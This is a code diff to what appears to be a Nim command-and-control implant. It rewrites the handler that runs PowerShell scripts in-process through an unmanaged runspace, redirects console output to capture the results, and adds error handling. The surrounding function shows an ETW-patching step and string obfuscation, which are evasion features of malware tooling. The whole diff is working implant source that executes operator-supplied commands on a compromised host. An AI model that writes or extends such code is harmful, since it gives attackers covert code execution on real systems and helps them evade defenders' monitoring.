@@ -37,19 +37,60 @@ proc powershell*(args : seq[string]) : string =
         if res == 2:
             result.add(obf("[+] ETW already patched!\n"))
     
-    let
-        Automation = load(obf("System.Management.Automation"))
-        RunspaceFactory = Automation.GetType(obf("System.Management.Automation.Runspaces.RunspaceFactory"))
-    var
-        runspace = @RunspaceFactory.CreateRunspace()
-        pipeline = runspace.CreatePipeline()
-
-    runspace.Open()
-    pipeline.Commands.AddScript(commandArgs)
-    pipeline.Commands.Add(obf("Out-String"))
-
-    var pipeOut = pipeline.Invoke()
-    for i in countUp(0, pipeOut.Count() - 1):
-        result.add($pipeOut.Item(i))
-
-    runspace.Dispose()
+    try:
+        # Load PowerShell assembly
+        let Automation = load("System.Management.Automation")
+        let RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")
+        
+        # Create runspace and pipeline
+        var runspace = @RunspaceFactory.CreateRunspace()
+        var pipeline = runspace.CreatePipeline()
+        
+        # Set up output capture
+        let mscorlib = load("mscorlib")
+        let consoleType = mscorlib.GetType("System.Console")
+        let stringBuilderType = mscorlib.GetType("System.Text.StringBuilder")
+        let stringWriterType = mscorlib.GetType("System.IO.StringWriter")
+        
+        # Create objects for the capture
+        let sb = mscorlib.new("System.Text.StringBuilder")
+        let sw = mscorlib.new("System.IO.StringWriter", sb)
+        
+        # Save original outputs
+        let oldOut = @consoleType.Out
+        let oldErr = @consoleType.Error
+        
+        try:
+            # Redirect standard output and error
+            @consoleType.SetOut(sw)
+            @consoleType.SetError(sw)
+            
+            # Execute PowerShell command
+            runspace.Open()
+            pipeline.Commands.AddScript(commandArgs)
+            
+            var pipeOut = pipeline.Invoke()
+            
+            # Process output
+            if pipeOut.Count() > 0:
+                result.add(obf("\n[+] PowerShell Output:\n"))
+                result.add("==================================================\n")
+                for i in countUp(0, pipeOut.Count() - 1):
+                    let item = $pipeOut.Item(i)
+                    if item != "":
+                        result.add(item & "\n")
+                result.add("==================================================\n")
+            
+            result.add(obf("[+] PowerShell command executed successfully.\n"))
+            
+        finally:
+            # Restore original outputs
+            @consoleType.SetOut(oldOut)
+            @consoleType.SetError(oldErr)
+            
+            # Clean up
+            runspace.Dispose()
+            pipeline.Dispose()
+            
+    except Exception as e:
+        result.add(obf("[-] Error executing PowerShell: ") & getCurrentExceptionMsg() & "\n")
